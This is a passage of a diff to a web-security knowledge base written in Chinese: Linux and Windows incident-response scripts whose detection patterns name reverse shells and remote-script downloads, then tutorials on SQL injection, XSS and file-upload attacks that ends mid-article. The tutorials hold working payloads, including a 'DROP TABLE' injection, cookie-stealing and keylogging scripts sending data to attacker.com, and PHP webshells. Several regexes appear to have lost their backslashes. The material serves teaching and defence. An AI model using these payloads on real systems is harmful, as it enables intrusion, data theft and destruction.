+                if "nc " in command and ("-e" in command or "-l" in command):
+                    reasons.append("netcat 反弹")
+                if "curl" in command and "bash" in command:
+                    reasons.append("远程脚本执行")
+                if "python" in command and "socket" in command:
+                    reasons.append("Python socket 后门")
+
+                if reasons:
+                    suspicious.append({
+                        "pid": pid,
+                        "user": user,
+                        "command": command,
+                        "reasons": reasons,
+                        "severity": "HIGH" if "反弹 shell" in reasons else "MEDIUM"
+                    })
+
+        except Exception as e:
+            self.findings.append(f"[ERROR] 进程检查失败: {e}")
+
+        return suspicious
+
+    def check_etc_passwd(self):
+        """检查 /etc/passwd 异常"""
+        issues = []
+
+        try:
+            with open("/etc/passwd") as f:
+                lines = f.readlines()
+
+            for line in lines:
+                parts = line.strip().split(":")
+                if len(parts) < 7:
+                    continue
+
+                username, uid, gid, gecos, home, shell = parts[0], parts[2], parts[3], parts[4], parts[5], parts[6]
+
+                # 检查 UID=0 的非 root 用户
+                if uid == "0" and username != "root":
+                    issues.append({
+                        "type": "UID_0_USER",
+                        "detail": f"UID=0 用户: {username}",
+                        "severity": "CRITICAL"
+                    })
+
+                # 检查可登录用户
+                if shell not in ["/usr/sbin/nologin", "/bin/false", "/sbin/nologin", ""]:
+                    if username not in ["root", "admin", "sysadmin"]:
+                        # 检查是否是最近新增的
+                        issues.append({
+                            "type": "LOGIN_USER",
+                            "detail": f"可登录用户: {username} (shell: {shell})",
+                            "severity": "LOW"
+                        })
+
+        except Exception as e:
+            self.findings.append(f"[ERROR] passwd 检查失败: {e}")
+
+        return issues
+
+    def check_crontab(self):
+        """检查所有用户的 crontab"""
+        suspicious = []
+
+        suspicious_patterns = [
+            r"/dev/tcp",
+            r"bashs+-i",
+            r"ncs+.*-e",
+            r"curl.*|.*bash",
+            r"wget.*|.*bash",
+            r"python.*socket",
+            r"perl.*socket",
+            r"ruby.*socket",
+        ]
+
+        try:
+            # 检查系统 crontab
+            system_crons = ["/etc/crontab", "/etc/anacrontab"]
+            for cron_file in system_crons:
+                if os.path.exists(cron_file):
+                    with open(cron_file) as f:
+                        content = f.read()
+                        for pattern in suspicious_patterns:
+                            if re.search(pattern, content, re.IGNORECASE):
+                                suspicious.append({
+                                    "type": "SYSTEM_CRON",
+                                    "file": cron_file,
+                                    "pattern": pattern,
+                                    "severity": "HIGH"
+                                })
+
+            # 检查 /etc/cron.d/
+            if os.path.isdir("/etc/cron.d"):
+                for f in os.listdir("/etc/cron.d"):
+                    filepath = os.path.join("/etc/cron.d", f)
+                    with open(filepath) as fh:
+                        content = fh.read()
+                        for pattern in suspicious_patterns:
+                            if re.search(pattern, content, re.IGNORECASE):
+                                suspicious.append({
+                                    "type": "CRON_D",
+                                    "file": filepath,
+                                    "pattern": pattern,
+                                    "severity": "HIGH"
+                                })
+
+            # 检查用户 crontab
+            result = subprocess.check_output(
+                ["cut", "-f1", "-d:", "/etc/passwd"],
+                text=True
+            )
+            for user in result.splitlines():
+                user = user.strip()
+                if user:
+                    try:
+                        cron = subprocess.check_output(
+                            ["crontab", "-l", "-u", user],
+                            text=True,
+                            stderr=subprocess.DEVNULL
+                        )
+                        for pattern in suspicious_patterns:
+                            if re.search(pattern, cron, re.IGNORECASE):
+                                suspicious.append({
+                                    "type": "USER_CRON",
+                                    "user": user,
+                                    "pattern": pattern,
+                                    "severity": "HIGH"
+                                })
+                    except subprocess.CalledProcessError:
+                        pass
+
+        except Exception as e:
+            self.findings.append(f"[ERROR] Crontab 检查失败: {e}")
+
+        return suspicious
+
+    def generate_report(self):
+        """生成完整报告"""
+        report = {
+            "timestamp": datetime.now().isoformat(),
+            "hostname": os.uname().nodename,
+            "findings": {
+                "suspicious_processes": self.check_suspicious_processes(),
+                "passwd_issues": self.check_etc_passwd(),
+                "cron_issues": self.check_crontab()
+            }
+        }
+
+        # 统计
+        total_critical = sum(
+            1 for category in report["findings"].values()
+            for item in category
+            if isinstance(item, dict) and item.get("severity") == "CRITICAL"
+        )
+
+        report["summary"] = {
+            "total_findings": sum(len(v) for v in report["findings"].values()),
+            "critical": total_critical,
+            "status": "需要立即处理" if total_critical > 0 else "需要审查"
+        }
+
+        return report
+
+if __name__ == "__main__":
+    ir = LinuxIR()
+    report = ir.generate_report()
+    print(json.dumps(report, indent=2, ensure_ascii=False))
+\`\`\`
+
+## 安全加固
+
+1. **账户安全加固**
+   - 禁用不必要的账户，锁定默认账户
+   - 实施强密码策略：最小12位，包含大小写字母、数字和特殊字符
+   - 启用 PAM 模块进行账户审计
+   - 配置 SSH 使用密钥认证，禁用密码认证
+   - 使用 fail2ban 防止暴力破解
+
+2. **文件系统加固**
+   - 对关键目录设置不可变属性：\`chattr +i /etc/passwd /etc/shadow\`
+   - 使用 AIDE 部署文件完整性监控
+   - 定期审计 SUID/SGID 文件
+   - 配置挂载选项：\`noexec,nosuid,nodev\` 用于 /tmp, /var/tmp
+
+3. **进程和服务加固**
+   - 使用 systemd 的安全选项：\`ProtectSystem=strict\`, \`ProtectHome=true\`, \`NoNewPrivileges=true\`
+   - 限制服务账户权限
+   - 启用 seccomp 和 AppArmor/SELinux
+
+4. **日志与监控**
+   - 部署集中日志系统（ELK/Graylog/Splunk）
+   - 启用 auditd 监控关键系统调用
+   - 配置实时告警：异常登录、新用户创建、SUID 变更等
+   - 定期执行安全扫描脚本
     `
   },
   {
@@ -1348,6 +3375,392 @@ reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 - **Process Explorer**：进程分析
 - **Process Monitor**：行为监控
 - **WinPEAS**：提权检查
+
+## 实战案例
+
+### 案例：Windows 域成员主机被入侵后的应急响应
+
+\`\`\`
+Windows 应急响应流程：
+
+┌──────────────┐
+│  事件检测     │  EDR 告警 / SIEM 规则触发
+└──────┬───────┘
+       │
+       ▼
+┌──────────────┐
+│  远程隔离     │  断开 RDP / 阻断网络 / 保留内存
+└──────┬───────┘
+       │
+       ▼
+┌──────────────────────────────────────┐
+│              本机排查                  │
+├──────┬──────┬──────┬──────┬──────────┤
+│ 账户  │ 进程  │ 文件  │ 日志  │ 注册表   │
+└──────┴──────┴──────┴──────┴──────────┘
+       │
+       ▼
+┌──────────────┐
+│  攻击还原     │  事件日志时间线 / Sysmon 分析
+└──────┬───────┘
+       │
+       ▼
+┌──────────────┐
+│  清除与恢复   │  删除恶意文件 / 修补漏洞 / 重置凭据
+└──────────────┘
+\`\`\`
+
+\`\`\`powershell
+# 完整的 Windows 应急响应 PowerShell 脚本
+
+# === 阶段1：基本信息收集 ===
+Write-Host "\`n[*] ===== 系统基本信息 =====" -ForegroundColor Cyan
+
+$os = Get-CimInstance Win32_OperatingSystem
+Write-Host "[+] 主机名: $($env:COMPUTERNAME)"
+Write-Host "[+] 操作系统: $($os.Caption) $($os.Version)"
+Write-Host "[+] 系统启动时间: $($os.LastBootUpTime)"
+Write-Host "[+] 当前时间: $(Get-Date)"
+Write-Host "[+] 运行时间: $((New-TimeSpan -Start $os.LastBootUpTime -End (Get-Date)).Days) 天"
+
+# === 阶段2：账户安全排查 ===
+Write-Host "\`n[*] ===== 账户安全排查 =====" -ForegroundColor Cyan
+
+# 查看本地用户
+Write-Host "\`n[+] 本地用户账户:"
+Get-LocalUser | Format-Table Name, Enabled, LastLogon, PasswordLastSet -AutoSize
+
+# 查看管理员组
+Write-Host "[+] 管理员组成员:"
+Get-LocalGroupMember -Group "Administrators" | Format-Table Name, ObjectClass, PrincipalSource -AutoSize
+
+# 检查隐藏用户（用户名以 $ 结尾）
+Write-Host "[+] 隐藏用户（$ 结尾）:"
+Get-LocalUser | Where-Object { $_.Name -match '$$' }
+
+# 检查远程桌面用户
+Write-Host "[+] 远程桌面用户组:"
+Get-LocalGroupMember -Group "Remote Desktop Users" -ErrorAction SilentlyContinue
+
+# 检查最近登录
+Write-Host "[+] 最近登录记录:"
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 50 -ErrorAction SilentlyContinue |
+    Where-Object { $_.TimeCreated -gt (Get-Date).AddDays(-7) } |
+    Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}}, @{N='LogonType';E={$_.Properties[8].Value}} |
+    Format-Table -AutoSize
+
+# === 阶段3：进程排查 ===
+Write-Host "\`n[*] ===== 进程排查 =====" -ForegroundColor Cyan
+
+# 查看所有进程及其路径
+Write-Host "[+] 异常进程（无签名或路径异常）:"
+Get-Process | ForEach-Object {
+    $proc = $_
+    try {
+        $path = $proc.MainModule.FileName
+        $signature = Get-AuthenticodeSignature -FilePath $path -ErrorAction SilentlyContinue
+        if ($signature.Status -ne "Valid" -and $path -notmatch "Windows|Microsoft|Program Files") {
+            [PSCustomObject]@{
+                PID = $proc.Id
+                Name = $proc.ProcessName
+                Path = $path
+                Signature = $signature.Status
+            }
+        }
+    } catch {}
+} | Format-Table -AutoSize
+
+# 查看网络连接进程
+Write-Host "[+] 外部网络连接:"
+Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue |
+    Where-Object { $_.RemoteAddress -notmatch "^(127.|0.0.0.0|::)" } |
+    Select-Object LocalPort, RemoteAddress, RemotePort,
+        @{N='ProcessName';E={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}} |
+    Format-Table -AutoSize
+
+# === 阶段4：启动项排查 ===
+Write-Host "\`n[*] ===== 启动项排查 =====" -ForegroundColor Cyan
+
+# 注册表启动项
+Write-Host "[+] 注册表启动项:"
+$startupKeys = @(
+    "HKLM:SoftwareMicrosoftWindowsCurrentVersionRun",
+    "HKLM:SoftwareMicrosoftWindowsCurrentVersionRunOnce",
+    "HKCU:SoftwareMicrosoftWindowsCurrentVersionRun",
+    "HKCU:SoftwareMicrosoftWindowsCurrentVersionRunOnce",
+    "HKLM:SoftwareMicrosoftWindowsCurrentVersionRunServices",
+    "HKLM:SoftwareMicrosoftWindowsCurrentVersionRunServicesOnce"
+)
+
+foreach ($key in $startupKeys) {
+    if (Test-Path $key) {
+        Write-Host "\`n  $key :"
+        Get-ItemProperty $key | Select-Object * -ExcludeProperty PS* | ForEach-Object {
+            $_.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object {
+                Write-Host "    $($_.Name): $($_.Value)"
+            }
+        }
+    }
+}
+
+# 计划任务
+Write-Host "\`n[+] 异常计划任务:"
+Get-ScheduledTask | Where-Object {
+    $_.State -ne "Disabled" -and
+    $_.TaskPath -notmatch "Microsoft" -and
+    $_.Actions.Execute -notmatch "svchost|explorer"
+} | Select-Object TaskName, TaskPath,
+    @{N='Action';E={$_.Actions.Execute}},
+    @{N='LastRunTime';E={(Get-ScheduledTaskInfo -TaskName $_.TaskName -ErrorAction SilentlyContinue).LastRunTime}} |
+    Format-Table -AutoSize
+
+# === 阶段5：服务排查 ===
+Write-Host "\`n[*] ===== 异常服务 =====" -ForegroundColor Cyan
+Get-CimInstance Win32_Service | Where-Object {
+    $_.PathName -notmatch "System32|SysWOW64|Windows" -and
+    $_.StartMode -eq "Auto"
+} | Select-Object Name, DisplayName, PathName, StartMode, State |
+    Format-Table -AutoSize
+
+# === 阶段6：日志分析 ===
+Write-Host "\`n[*] ===== 关键安全事件 =====" -ForegroundColor Cyan
+
+# 登录失败事件
+Write-Host "[+] 最近登录失败事件:"
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 20 -ErrorAction SilentlyContinue |
+    Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}},
+        @{N='Source';E={$_.Properties[19].Value}} |
+    Format-Table -AutoSize
+
+# 新用户创建事件
+Write-Host "[+] 新用户创建事件 (Event ID 4720):"
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720} -ErrorAction SilentlyContinue |
+    Where-Object { $_.TimeCreated -gt (Get-Date).AddDays(-30) } |
+    Select-Object TimeCreated, @{N='CreatedUser';E={$_.Properties[0].Value}},
+        @{N='Creator';E={$_.Properties[4].Value}} |
+    Format-Table -AutoSize
+
+# PowerShell 日志
+Write-Host "[+] 异常 PowerShell 模块加载:"
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} -MaxEvents 50 -ErrorAction SilentlyContinue |
+    Where-Object { $_.Message -match "Invoke-Expression|IEX|DownloadString|Net.WebClient" } |
+    Select-Object TimeCreated, @{N='ScriptBlock';E={$_.Properties[2].Value}} |
+    Format-Table -AutoSize
+\`\`\`
+
+\`\`\`python
+# Windows 事件日志分析脚本
+
+import subprocess
+import json
+import re
+from collections import Counter
+from datetime import datetime, timedelta
+
+class WindowsIRAnalyzer:
+    """
+    Windows 事件日志 IR 分析器
+    """
+
+    # 重要事件 ID
+    CRITICAL_EVENTS = {
+        4624: "登录成功",
+        4625: "登录失败",
+        4648: "明文凭据登录",
+        4672: "特殊权限分配",
+        4720: "用户账户创建",
+        4722: "用户账户启用",
+        4724: "密码重置尝试",
+        4726: "用户账户删除",
+        4728: "安全组成员添加",
+        4732: "本地组成员添加",
+        4756: "通用组成员添加",
+        4768: "Kerberos TGT 请求",
+        4769: "Kerberos 服务票据请求",
+        4776: "NTLM 认证",
+        5140: "网络共享访问",
+        5156: "Windows 防火墙允许连接",
+    }
+
+    def __init__(self, hostname="localhost"):
+        self.hostname = hostname
+
+    def get_events(self, log_name, event_id=None, hours=24, max_events=1000):
+        """通过 wevtutil 获取事件"""
+        query = f"wevtutil qe {log_name} /c:{max_events} /f:text /rd:true"
+
+        if event_id:
+            query += f" /q:"*[System[(EventID={event_id})]]""
+
+        try:
+            result = subprocess.check_output(
+                ["powershell", "-Command", query],
+                text=True,
+                timeout=60
+            )
+            return result
+        except Exception as e:
+            return f"Error: {e}"
+
+    def analyze_logon_events(self, hours=24):
+        """分析登录事件"""
+        findings = []
+
+        # 4624 - 登录成功
+        login_success = self.get_events("Security", 4624, hours)
+        # 4625 - 登录失败
+        login_failures = self.get_events("Security", 4625, hours)
+
+        # 统计来源 IP
+        source_ips = re.findall(r'IpAddress:s+(d+.d+.d+.d+)', login_failures)
+        ip_counter = Counter(source_ips)
+
+        # 检测暴力破解
+        for ip, count in ip_counter.most_common(10):
+            if count > 50:
+                findings.append({
+                    "type": "BRUTE_FORCE",
+                    "severity": "HIGH",
+                    "detail": f"来源 {ip} 在 {hours} 小时内有 {count} 次登录失败",
+                    "recommendation": "考虑封禁该 IP，检查账户是否被锁定"
+                })
+
+        # 检测异常时间登录
+        night_logins = re.findall(r'时间:s+(d{4}-d{2}-d{2}Td{2}:d{2}:d{2})', login_success)
+        for time_str in night_logins:
+            try:
+                hour = int(time_str.split("T")[1].split(":")[0])
+                if 0 <= hour <= 6:
+                    findings.append({
+                        "type": "ABNORMAL_LOGON_TIME",
+                        "severity": "MEDIUM",
+                        "detail": f"凌晨登录: {time_str}",
+                        "recommendation": "确认是否为正常操作"
+                    })
+            except:
+                pass
+
+        return findings
+
+    def analyze_powershell_events(self, hours=24):
+        """分析 PowerShell 事件"""
+        findings = []
+
+        # 4104 - Script Block Logging
+        events = self.get_events("Microsoft-Windows-PowerShell/Operational", 4104, hours)
+
+        suspicious_patterns = [
+            (r'Invoke-Expression', "动态代码执行"),
+            (r'IEXs+(', "IEX 调用"),
+            (r'Net.WebClient.*DownloadString', "远程脚本下载"),
+            (r'Net.Sockets.TCPClient', "Socket 连接"),
+            (r'Add-Type.*-TypeDefinition.*DllImport', "P/Invoke 调用"),
+            (r'Start-Process.*-WindowStyles+Hidden', "隐藏进程启动"),
+            (r'New-Object.*-ComObjects+WScript.Shell', "WScript COM 对象"),
+            (r'base64', "Base64 编码命令"),
+        ]
+
+        for pattern, desc in suspicious_patterns:
+            if re.search(pattern, events, re.IGNORECASE):
+                findings.append({
+                    "type": "POWERSHELL_SUSPICIOUS",
+                    "severity": "HIGH",
+                    "detail": f"检测到可疑 PowerShell 模式: {desc}",
+                    "recommendation": "检查 PowerShell 脚本来源和执行上下文"
+                })
+
+        return findings
+
+    def generate_timeline(self, hours=48):
+        """生成事件时间线"""
+        events = []
+
+        # 获取多个日志源
+        logs = [
+            ("Security", 4624), ("Security", 4625),
+            ("Security", 4720), ("Security", 4732),
+            ("System", 7045),  # 新服务安装
+        ]
+
+        for log_name, event_id in logs:
+            raw = self.get_events(log_name, event_id, hours, 200)
+            # 提取时间戳
+            timestamps = re.findall(r'时间:s+(d{4}-d{2}-d{2}Td{2}:d{2}:d{2})', raw)
+            for ts in timestamps:
+                events.append({
+                    "time": ts,
+                    "log": log_name,
+                    "event_id": event_id,
+                    "description": self.CRITICAL_EVENTS.get(event_id, "Unknown")
+                })
+
+        # 按时间排序
+        events.sort(key=lambda x: x["time"], reverse=True)
+        return events
+
+    def generate_report(self):
+        """生成完整 IR 报告"""
+        report = {
+            "hostname": self.hostname,
+            "timestamp": datetime.now().isoformat(),
+            "findings": {
+                "logon_anomalies": self.analyze_logon_events(),
+                "powershell_suspicious": self.analyze_powershell_events(),
+                "timeline": self.generate_timeline()
+            }
+        }
+
+        # 统计
+        total_findings = sum(
+            len(v) for k, v in report["findings"].items() if isinstance(v, list)
+        )
+        critical_count = sum(
+            1 for v in report["findings"].values()
+            if isinstance(v, list)
+            for item in v
+            if isinstance(item, dict) and item.get("severity") in ["CRITICAL", "HIGH"]
+        )
+
+        report["summary"] = {
+            "total_findings": total_findings,
+            "critical": critical_count,
+            "status": "需要立即响应" if critical_count > 0 else "需要审查"
+        }
+
+        return report
+
+if __name__ == "__main__":
+    analyzer = WindowsIRAnalyzer()
+    report = analyzer.generate_report()
+    print(json.dumps(report, indent=2, ensure_ascii=False, default=str))
+\`\`\`
+
+## 安全加固
+
+1. **账户安全**
+   - 启用多因素认证（MFA），特别是管理员账户
+   - 实施 LAPS 管理本地管理员密码
+   - 禁用内置管理员账户（Administrator），创建自定义管理员账户
+   - 配置账户锁定策略：5次失败后锁定30分钟
+   - 启用 Credential Guard 防止凭据窃取
+
+2. **日志与监控**
+   - 启用高级审计策略：登录/注销、特权使用、账户管理
+   - 启用 PowerShell 日志：Module Logging、Script Block Logging、Transcription
+   - 部署 Sysmon 增强日志能力
+   - 集中日志到 SIEM 并配置实时告警
+
+3. **端点防护**
+   - 部署 EDR 解决方案（Microsoft Defender for Endpoint / CrowdStrike）
+   - 启用 Windows Defender 实时保护和云查杀
+   - 配置 ASR（Attack Surface Reduction）规则
+   - 启用 Controlled Folder Access 防勒索软件
+
+4. **网络防护**
+   - 启用 Windows 防火墙，限制入站/出站规则
+   - 启用 SMB 签名和加密
+   - 配置 Windows Defender Firewall with Advanced Security
+   - 部署网络级别认证（NLA）用于 RDP
     `
   },
   // 工具手册 - 补充
@@ -1525,7 +3938,843 @@ requests:
 | -json | JSON格式输出 |
     `
   },
-  // Web安全进阶
+  // Web安全
+  {
+    slug: 'sql-injection',
+    title: 'SQL 注入漏洞详解',
+    date: '2026-06-20',
+    category: 'websec',
+    subcategory: 'sqli',
+    tags: ['Web安全', 'SQL注入', '注入'],
+    summary: 'SQL 注入原理、类型、绕过技巧和防御方案。',
+    content: `
+## 什么是 SQL 注入
+
+SQL 注入是通过在输入中插入恶意 SQL 语句，使后端数据库执行非预期操作的攻击方式。
+
+## SQL 注入流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 入口发现   │───>│ 2. 注入判断   │───>│ 3. 类型判断   │───>│ 4. 数据提取   │
+│ 参数/头部/Cookie│    │ 逻辑/报错回显 │    │ Union/布尔/时间│    │ 脱库/RCE     │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  表单/URL/API        单引号/逻辑测试      联合查询/报错注入    数据库名/表/字段
+  HTTP头部注入        布尔盲注/时间盲注    堆叠查询            敏感数据
+\`\`\`
+
+## 常见类型
+
+### 1. Union 注入
+
+\`\`\`sql
+-- 判断列数
+' ORDER BY 1-- -
+' ORDER BY 5-- -  -- 报错说明有4列
+
+-- 联合查询
+' UNION SELECT 1,2,3,4-- -
+' UNION SELECT 1,database(),3,4-- -
+' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
+\`\`\`
+
+### 2. 报错注入
+
+\`\`\`sql
+-- extractvalue
+' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- -
+
+-- updatexml
+' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- -
+
+-- floor
+' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+\`\`\`
+
+### 3. 布尔盲注
+
+\`\`\`sql
+-- 判断数据库名长度
+' AND length(database())=8-- -
+
+-- 逐字符判断
+' AND ascii(substr(database(),1,1))>100-- -
+' AND ascii(substr(database(),1,1))>115-- -
+\`\`\`
+
+### 4. 时间盲注
+
+\`\`\`sql
+' AND IF(ascii(substr(database(),1,1))>115, sleep(3), 0)-- -
+' AND IF(length(database())=8, sleep(3), 0)-- -
+\`\`\`
+
+### 5. 堆叠注入
+
+\`\`\`sql
+'; DROP TABLE users;-- -
+'; INSERT INTO users VALUES('admin','hacked');-- -
+\`\`\`
+
+## 绕过技巧
+
+\`\`\`sql
+-- 大小写绕过
+SeLeCt
+
+-- 双写绕过
+selselectect
+
+-- 内联注释
+/*!50000SELECT*/
+
+-- 空格绕过
+/**/  %09  %0a  %0b  %0c  %0d
+
+-- 等号绕过
+' AND '1'<'2
+' AND 1 LIKE 1
+\`\`\`
+
+## 实战案例
+
+### 案例1：登录绕过
+
+\`\`\`sql
+-- 用户名框输入
+admin' OR '1'='1'/*
+-- 密码框输入
+anything
+
+-- 实际执行SQL
+SELECT * FROM users WHERE username='admin' OR '1'='1'/*' AND password='anything'
+\`\`\`
+
+### 案例2：使用 SQLmap 自动化
+
+\`\`\`bash
+# 基本检测
+sqlmap -u "http://target/?id=1" --batch
+
+# POST注入
+sqlmap -u "http://target/login" --data="user=admin&pass=123" -p user --batch
+
+# 获取所有数据库
+sqlmap -u "http://target/?id=1" --dbs --batch
+
+# 获取指定表数据
+sqlmap -u "http://target/?id=1" -D mydb -T users --dump --batch
+
+# 绕过WAF
+sqlmap -u "http://target/?id=1" --tamper=space2comment,between --random-agent --batch
+
+# 执行系统命令
+sqlmap -u "http://target/?id=1" --os-shell --batch
+\`\`\`
+
+## 安全加固
+
+1. **使用参数化查询**：使用预编译语句（Prepared Statement），禁止字符串拼接SQL
+2. **输入验证**：对输入做白名单校验，过滤特殊字符
+3. **最小权限**：数据库账户只授予必要的最小权限
+4. **错误处理**：不要向用户暴露详细数据库错误信息
+5. **使用 ORM 框架**：使用 SQLAlchemy、MyBatis 等框架的参数化接口
+6. **部署 WAF**：使用 ModSecurity、云 WAF 拦截 SQL 注入特征
+7. **定期扫描**：使用 SQLmap、Nuclei 等工具定期进行安全扫描
+8. **敏感数据加密**：对数据库中的敏感字段加密存储
+    `
+  },
+  {
+    slug: 'xss-attack',
+    title: 'XSS 跨站脚本攻击详解',
+    date: '2026-06-19',
+    category: 'websec',
+    subcategory: 'xss',
+    tags: ['Web安全', 'XSS', '跨站脚本'],
+    summary: 'XSS 漏洞原理、类型、绕过技巧和防御方案。',
+    content: `
+## 什么是 XSS
+
+XSS（Cross-Site Scripting）跨站脚本攻击，攻击者在网页中注入恶意脚本，当用户浏览时执行。
+
+## XSS 攻击流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 注入点发现 │───>│ 2. Payload   │───>│ 3. 触发执行   │───>│ 4. 数据窃取   │
+│ 搜索/评论/URL │    │ 构造恶意脚本  │    │ 用户浏览器执行 │    │ Cookie/Token  │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  输入点/输出点         script/alert/img     反射/存储/DOM        会话劫持/钓鱼
+  HTML/JS上下文         onerror/onload       self/webpack        键盘记录/重定向
+\`\`\`
+
+## 常见类型
+
+### 1. 反射型 XSS
+
+\`\`\`html
+# URL参数直接输出到页面
+https://target.com/search?q=<script>alert(1)</script>
+
+# 服务器端代码（错误示例）
+echo "搜索结果: " . $_GET['q'];
+\`\`\`
+
+### 2. 存储型 XSS
+
+\`\`\`html
+# 评论区注入恶意脚本
+<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
+
+# 持久化存储，每个访问者都会执行
+\`\`\`
+
+### 3. DOM 型 XSS
+
+\`\`\`javascript
+// 前端JavaScript直接操作DOM
+document.getElementById('output').innerHTML = location.hash.slice(1);
+
+# URL
+https://target.com/#<img src=x onerror=alert(1)>
+\`\`\`
+
+## 常见绕过技巧
+
+\`\`\`html
+# 大小写混合
+<ScRiPt>alert(1)</sCrIpT>
+
+# 双写标签
+<scrscriptipt>alert(1)</scrscriptipt>
+
+# 事件处理
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+
+# 编码绕过
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+
+# 无括号
+<img src=x onerror=alert\`1\`>
+
+# 无分号
+<script>alert(1)</script>
+
+# 使用javascript伪协议
+<a href="javascript:alert(1)">click</a>
+\`\`\`
+
+## 实战案例
+
+### 案例1：窃取用户 Cookie
+
+\`\`\`javascript
+// Payload
+<script>
+new Image().src="https://attacker.com/steal?c="+document.cookie;
+</script>
+
+// 攻击者服务器记录
+// GET /steal?c=session_id=abc123;token=xyz789
+\`\`\`
+
+### 案例2：XSS 获取键盘记录
+
+\`\`\`javascript
+// 注入键盘记录脚本
+document.onkeypress=function(e){
+    new Image().src="https://attacker.com/keylog?k="+e.key;
+}
+\`\`\`
+
+### 案例3：使用 XSStrike 自动化检测
+
+\`\`\`bash
+# 安装
+git clone https://github.com/s0md3v/XSStrike
+cd XSStrike
+pip install -r requirements.txt
+
+# 检测
+python xsstrike.py -u "http://target.com/search?q=test"
+
+# POST请求检测
+python xsstrike.py -u "http://target.com/comment" --data "comment=test"
+\`\`\`
+
+### 案例4：CSP 绕过
+
+\`\`\`html
+# 如果CSP允许 cdn.jsdelivr.net
+<script src="https://cdn.jsdelivr.net/npm/xss@0.3.8/dist/xss.min.js"></script>
+<script>xss.innerHTML=xss.filterXSS(location.hash.slice(1))</script>
+\`\`\`
+
+## 安全加固
+
+1. **输出编码**：根据上下文（HTML/JS/URL/CSS）进行适当编码
+2. **使用 CSP**：设置 Content-Security-Policy，限制脚本来源
+3. **输入验证**：白名单过滤，拒绝恶意标签和事件属性
+4. **HttpOnly Cookie**：设置 HttpOnly 标志，防止 JavaScript 读取 Cookie
+5. **使用安全框架**：React/Vue 等框架默认对输出进行转义
+6. **DOMPurify**：对用户输入的 HTML 使用 DOMPurify 消毒
+7. **X-XSS-Protection**：启用浏览器内置 XSS 过滤器
+8. **定期扫描**：使用 XSStrike、Nuclei 等工具定期检测
+    `
+  },
+  {
+    slug: 'file-upload',
+    title: '文件上传漏洞详解',
+    date: '2026-06-18',
+    category: 'websec',
+    subcategory: 'upload',
+    tags: ['Web安全', '文件上传', 'Webshell'],
+    summary: '文件上传漏洞原理、绕过技巧和防御方案。',
+    content: `
+## 什么是文件上传漏洞
+
+当服务器对用户上传的文件类型、内容未做严格校验时，攻击者可上传恶意文件（如 Webshell）获取服务器控制权。
+
+## 攻击流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 上传点发现 │───>│ 2. 绕过校验   │───>│ 3. 文件解析   │───>│ 4. 代码执行   │
+│ 表单/API端点  │    │ 前端/后端检测 │    │ 服务器解析执行 │    │ RCE/数据窃取  │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  头像/附件/文档      扩展名/MIME/内容     Apache/Nginx解析      Webshell管理
+  编辑器上传         双写/截断/竞争       文件包含触发          反弹Shell
+\`\`\`
+
+## 常见绕过技巧
+
+### 1. 扩展名绕过
+
+\`\`\`
+.php → .php3 .php5 .phtml .pht .phps .phar
+.jsp → .jspx .jspa .jsw .jsv
+.asp → .asa .cer .cdx
+大小写：.PhP .pHP .PHP
+双写：.pphphp
+\`\`\`
+
+### 2. MIME 类型绕过
+
+\`\`\`http
+Content-Type: image/png
+# 修改为合法MIME但保留.php扩展名
+\`\`\`
+
+### 3. 文件头/内容绕过
+
+\`\`\`php
+# 图片马 - 在图片文件开头添加PHP代码
+GIF89a<?php system($_GET['cmd']); ?>
+
+# 或在EXIF信息中嵌入
+exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
+\`\`\`
+
+### 4. .htaccess 绕过
+
+\`\`\`apache
+# 上传.htaccess文件，让服务器解析所有文件为PHP
+AddType application/x-httpd-php .jpg .png .gif
+\`\`\`
+
+### 5. 竞争条件绕过
+
+\`\`\`
+# 先上传Webshell，后删除
+# 利用上传和删除之间的时间差访问Webshell
+# 使用多线程同时上传和访问
+\`\`\`
+
+## 实战案例
+
+### 案例1：绕过前端验证
+
+\`\`\`javascript
+// 前端验证代码
+function checkFile() {
+    var ext = document.getElementById('file').value.split('.').pop();
+    if (['jpg','png','gif'].indexOf(ext) === -1) {
+        alert('只允许图片');
+        return false;
+    }
+    return true;
+}
+
+// 绕过方式：直接用Burp截获请求修改文件名
+// 或禁用JavaScript
+\`\`\`
+
+### 案例2：绕过后端验证上传Webshell
+
+\`\`\`http
+POST /upload HTTP/1.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="shell.php5"
+Content-Type: image/jpeg
+
+GIF89a<?php system($_POST['cmd']); ?>
+------WebKitFormBoundary--
+\`\`\`
+
+### 案例3：利用文件包含执行
+
